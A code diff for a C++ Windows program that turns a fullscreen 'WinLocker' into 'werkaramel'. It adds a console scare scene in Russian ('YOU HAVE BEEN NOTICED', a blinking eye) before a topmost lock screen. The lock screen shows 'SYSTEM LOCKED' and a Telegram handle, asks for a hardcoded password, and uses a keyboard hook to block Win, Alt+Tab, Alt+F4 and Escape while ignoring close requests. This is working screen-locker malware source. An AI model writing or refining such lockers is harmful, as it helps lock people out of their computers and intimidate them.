@@ -1,21 +1,112 @@
-// language: C++, file: locker.cpp, target: Windows 11 x64, MSVC
-// WinLocker — fullscreen password lock, password: 123
+// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
+// werkaramel — red console scare + fullscreen locker
 #include <windows.h>
 #include <windowsx.h>
 #include <string>
+#include <thread>
+#include <chrono>
 
 const std::wstring PASS = L"123";
 
+// ── глобалы локера ──────────────────────────────────────────
 std::wstring g_input;
 bool g_unlocked = false;
 bool g_wrong = false;
 HHOOK g_kbHook = nullptr;
 
-const COLORREF BG     = RGB(0, 0, 0);
-const COLORREF FG     = RGB(255, 255, 255);
-const COLORREF DIM    = RGB(90, 90, 90);
-const COLORREF ACCENT = RGB(200, 30, 30);
+const COLORREF L_BG     = RGB(0, 0, 0);
+const COLORREF L_FG     = RGB(255, 255, 255);
+const COLORREF L_DIM    = RGB(90, 90, 90);
+const COLORREF L_ACCENT = RGB(200, 30, 30);
 
+// ── консоль ─────────────────────────────────────────────────
+void SetConsoleColor(WORD attr) {
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), attr);
+}
+
+void Gotoxy(int x, int y) {
+    COORD c{ (SHORT)x, (SHORT)y };
+    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), c);
+}
+
+void TypeText(const std::wstring& s, int x, int y, int delay_ms = 80) {
+    Gotoxy(x, y);
+    for (wchar_t c : s) {
+        std::wcout << c;
+        std::wcout.flush();
+        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
+    }
+}
+
+void DrawEye(int frame) {
+    // два кадра — открытый и моргающий
+    const wchar_t* eye_open[] = {
+        L"          .-''''''''''-.          ",
+        L"        .'               '.        ",
+        L"       /                   \\       ",
+        L"      /     .-.     .-.     \\      ",
+        L"     |     /   \\   /   \\     |     ",
+        L"     |    | (O) | | (O) |    |     ",
+        L"     |     \\   /   \\   /     |     ",
+        L"      \\     '-'     '-'     /      ",
+        L"       \\                   /       ",
+        L"        '.               .'        ",
+        L"          '-...........-'          ",
+    };
+    const wchar_t* eye_blink[] = {
+        L"          .-''''''''''-.          ",
+        L"        .'               '.        ",
+        L"       /                   \\       ",
+        L"      /                     \\      ",
+        L"     |     ___________       |     ",
+        L"     |    |           |      |     ",
+        L"     |     -----------       |     ",
+        L"      \\                     /      ",
+        L"       \\                   /       ",
+        L"        '.               .'        ",
+        L"          '-...........-'          ",
+    };
+
+    const wchar_t** src = (frame % 6 == 5) ? eye_blink : eye_open;
+    int baseY = 6;
+    for (int i = 0; i < 11; ++i) {
+        Gotoxy(8, baseY + i);
+        std::wcout << src[i];
+    }
+}
+
+void RunConsoleScene() {
+    // переключаем консоль в UTF-16
+    SetConsoleOutputCP(CP_UTF8);
+    _setmode(_fileno(stdout), _O_U8TEXT);
+
+    HWND con = GetConsoleWindow();
+    SetWindowPos(con, HWND_TOP, 100, 100, 700, 500, 0);
+
+    // чёрный фон
+    system("color 0F");
+    system("cls");
+
+    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    TypeText(L"  ...обнаружена активность...", 5, 2, 60);
+    std::this_thread::sleep_for(std::chrono::milliseconds(700));
+
+    // красный фон, белый текст
+    system("color 4F");
+    system("cls");
+
+    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE
+                    | FOREGROUND_INTENSITY);
+    TypeText(L"  >>> ВАС ЗАМЕТИЛИ <<<", 8, 3, 100);
+
+    // мигающий глаз
+    for (int i = 0; i < 40; ++i) {
+        DrawEye(i);
+        std::this_thread::sleep_for(std::chrono::milliseconds(180));
+    }
+}
+
+// ── локер ───────────────────────────────────────────────────
 LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
     if (code == HC_ACTION && !g_unlocked) {
         auto* kb = (KBDLLHOOKSTRUCT*)lp;
@@ -23,8 +114,6 @@ LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
         if (vk == VK_LWIN || vk == VK_RWIN) return 1;
         if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
         if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
-        if (vk == VK_ESCAPE && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
-        if (vk == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1;
         if (vk == VK_ESCAPE) return 1;
         if (vk == VK_F11) return 1;
     }
@@ -50,20 +139,20 @@ void DrawTextEx(HDC dc, int x, int y, const wchar_t* s, COLORREF c,
     DeleteObject(font);
 }
 
-void Paint(HWND hwnd) {
+void LockerPaint(HWND hwnd) {
     PAINTSTRUCT ps;
     HDC dc = BeginPaint(hwnd, &ps);
     RECT rc; GetClientRect(hwnd, &rc);
 
-    HBRUSH bg = CreateSolidBrush(BG);
+    HBRUSH bg = CreateSolidBrush(L_BG);
     FillRect(dc, &rc, bg);
     DeleteObject(bg);
 
     int cx = rc.right / 2;
 
-    DrawTextEx(dc, 0, 180, L"SYSTEM LOCKED", ACCENT, 72, true, rc.right);
-    DrawTextEx(dc, 0, 280, L"enter password to continue", DIM, 22, true, rc.right);
-    DrawTextEx(dc, 0, 320, L"tg: @werkaramel", ACCENT, 28, true, rc.right);
+    DrawTextEx(dc, 0, 180, L"SYSTEM LOCKED", L_ACCENT, 72, true, rc.right);
+    DrawTextEx(dc, 0, 280, L"enter password to continue", L_DIM, 22, true, rc.right);
+    DrawTextEx(dc, 0, 320, L"tg: @werkaramel", L_ACCENT, 28, true, rc.right);
 
     RECT box{ cx - 250, 400, cx + 250, 460 };
     HBRUSH bf = CreateSolidBrush(RGB(15, 15, 15));
@@ -72,20 +161,20 @@ void Paint(HWND hwnd) {
     FrameRect(dc, &box, (HBRUSH)GetStockObject(WHITE_BRUSH));
 
     std::wstring masked(g_input.size(), L'*');
-    DrawTextEx(dc, cx - 230, 418, masked.c_str(), FG, 26, false, 0);
+    DrawTextEx(dc, cx - 230, 418, masked.c_str(), L_FG, 26, false, 0);
 
     if (g_wrong) {
-        DrawTextEx(dc, 0, 490, L"wrong password", ACCENT, 22, true, rc.right);
+        DrawTextEx(dc, 0, 500, L"wrong password", L_ACCENT, 24, true, rc.right);
     } else {
-        DrawTextEx(dc, 0, 490, L"[ Enter ]  unlock", DIM, 20, true, rc.right);
+        DrawTextEx(dc, 0, 500, L"[ Enter ]  unlock", L_DIM, 20, true, rc.right);
     }
 
     EndPaint(hwnd, &ps);
 }
 
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
+LRESULT CALLBACK LockerProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     switch (msg) {
-    case WM_PAINT: Paint(hwnd); return 0;
+    case WM_PAINT: LockerPaint(hwnd); return 0;
 
     case WM_KEYDOWN:
         if (wp == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
@@ -101,7 +190,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
 
     case WM_CLOSE: return 0;
 
-    case WM_CHAR: {
+    case WM_CHAR:
         if (wp == VK_BACK) {
             if (!g_input.empty()) g_input.pop_back();
             g_wrong = false;
@@ -121,7 +210,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         }
         InvalidateRect(hwnd, nullptr, FALSE);
         return 0;
-    }
 
     case WM_DESTROY:
         UnhookWindowsHookEx(g_kbHook);
@@ -131,22 +219,25 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     return DefWindowProcW(hwnd, msg, wp, lp);
 }
 
-int WINAPI wWinMain(HINSTANCE hi, HINSTANCE, PWSTR, int show) {
+void RunLocker(HINSTANCE hi) {
     WNDCLASSW wc{};
-    wc.lpfnWndProc   = WndProc;
+    wc.lpfnWndProc   = LockerProc;
     wc.hInstance     = hi;
     wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
     wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
-    wc.lpszClassName = L"winlocker";
+    wc.lpszClassName = L"werkaramel_locker";
     RegisterClassW(&wc);
 
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
 
     HWND hwnd = CreateWindowExW(
-        WS_EX_TOPMOST, L"winlocker", L"System Locked",
+        WS_EX_TOPMOST, L"werkaramel_locker", L"System Locked",
         WS_POPUP, 0, 0, sw, sh,
         nullptr, nullptr, hi, nullptr);
+
+    // скрываем консоль
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     ShowWindow(hwnd, SW_SHOWMAXIMIZED);
     SetForegroundWindow(hwnd);
@@ -159,5 +250,18 @@ int WINAPI wWinMain(HINSTANCE hi, HINSTANCE, PWSTR, int show) {
         TranslateMessage(&m);
         DispatchMessageW(&m);
     }
+}
+
+int wmain() {
+    // показываем консоль
+    ShowWindow(GetConsoleWindow(), SW_SHOW);
+
+    // сцена в консоли
+    RunConsoleScene();
+
+    // запускаем локер
+    HINSTANCE hi = GetModuleHandleW(nullptr);
+    RunLocker(hi);
+
     return 0;
 }
